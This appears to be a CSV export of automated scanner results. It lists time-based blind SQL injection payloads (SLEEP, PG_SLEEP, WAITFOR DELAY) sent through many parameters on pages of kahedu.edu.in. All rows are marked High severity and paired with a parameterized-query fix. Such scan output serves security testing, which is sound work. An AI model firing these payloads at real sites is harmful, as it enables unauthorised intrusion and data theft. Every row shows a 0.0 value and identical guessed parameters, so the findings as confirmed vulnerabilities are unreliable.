Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/about-us/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/about-us/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/about-us/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/about-us/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/about-us/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/about-us/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/about-us/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/about-us/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/about-us/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/about-us/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/about-us/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/about-us/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/about-us/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/about-us/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/about-us/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/about-us/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/about-us/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/about-us/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/about-us/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/about-us/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/about-us/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/about-us/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/about-us/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/about-us/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/about-us/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/about-us/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/about-us/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/about-us/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/about-us/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/about-us/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/about-us/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/about-us/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/about-us/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/about-us/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/about-us/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/about-us/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/about-us/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/about-us/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/about-us/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/about-us/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/about-us/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/about-us/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/about-us/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/about-us/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/about-us/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/about-us/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/about-us/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/about-us/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/about-us/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/about-us/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/about-us/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/about-us/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/about-us/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/about-us/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/about-us/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/about-us/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/about-us/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/about-us/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/about-us/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/about-us/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/about-us/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/about-us/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/about-us/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/about-us/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/about-us/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/about-us/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/about-us/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
